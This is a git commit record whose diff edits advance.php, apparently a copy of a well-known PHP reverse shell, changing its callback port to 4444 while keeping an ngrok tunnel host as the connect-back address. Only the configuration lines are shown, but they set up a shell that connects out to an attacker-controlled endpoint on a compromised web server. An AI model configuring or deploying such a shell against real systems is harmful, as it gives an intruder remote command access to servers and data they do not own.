311261c5b00ca7aab4cc3cd33f3272189d22ddfe
Hafiz Ramadhan <hfzrmd@gmail.com>
2022-06-06 22:31:09 +0700

    update port

--- advance.php
+++ advance.php
@@ -47,7 +47,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 14992;       // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
